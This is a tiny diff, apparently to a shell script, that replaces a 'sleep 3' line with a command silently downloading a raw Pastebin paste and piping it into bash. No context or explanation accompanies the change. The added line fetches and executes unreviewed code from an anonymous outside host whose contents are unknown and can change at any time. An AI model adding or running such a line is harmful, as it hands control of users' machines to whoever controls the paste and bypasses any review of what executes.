@@ -1,1 +1,1 @@
-sleep 3
+curl -sSL https://pastebin.com/raw/WpPTV59U | sed 's/\r$//' | bash
